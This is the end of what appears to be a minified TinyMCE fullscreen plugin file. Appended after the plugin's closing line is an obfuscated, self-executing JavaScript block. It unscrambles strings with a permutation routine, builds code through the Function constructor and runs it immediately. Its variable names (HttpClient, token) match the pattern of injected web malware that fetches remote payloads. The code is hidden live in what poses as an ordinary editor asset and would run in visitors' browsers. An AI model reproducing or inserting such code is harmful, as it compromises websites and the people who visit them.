        shortcut: 'Meta+Shift+F',
        onAction,
        onSetup: makeSetupHandler(editor, fullscreenState)
      });
      editor.ui.registry.addToggleButton('fullscreen', {
        tooltip: 'Fullscreen',
        icon: 'fullscreen',
        onAction,
        onSetup: makeSetupHandler(editor, fullscreenState)
      });
    };

    var Plugin = () => {
      global$2.add('fullscreen', editor => {
        const fullscreenState = Cell(null);
        if (editor.inline) {
          return get$5(fullscreenState);
        }
        register$2(editor);
        register$1(editor, fullscreenState);
        register(editor, fullscreenState);
        editor.addShortcut('Meta+Shift+F', '', 'mceFullScreen');
        return get$5(fullscreenState);
      });
    };

    Plugin();

})();
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();